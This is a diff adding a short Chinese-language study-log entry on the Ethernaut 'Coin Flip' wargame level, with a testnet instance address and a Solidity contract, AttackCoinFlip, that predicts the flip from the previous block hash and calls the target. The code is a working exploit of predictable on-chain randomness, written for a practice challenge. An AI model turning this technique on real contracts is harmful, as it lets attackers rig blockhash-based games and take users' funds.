@@ -236,5 +236,36 @@ contract SwappableTokenTwo is ERC20 {
 }
 ```
 
+### 2024.09.10
+#### Ethernaut - Coin Flip
+可以部署一个合约，提前算出这个回合的值，然后再调用目标合约
+实例地址：0xC4942cA0C3cF779AE244026Bd5768a79bC93FA91
+```
+contract AttackCoinFlip {
+    CoinFlip flip;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _flip) {
+        flip = CoinFlip(_flip);
+    }
+
+    function attack() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        bool res = flip.flip(side);
+        if (!res) {
+            revert();
+        }
+    }
+}
+```
+
 
 <!-- Content_END -->
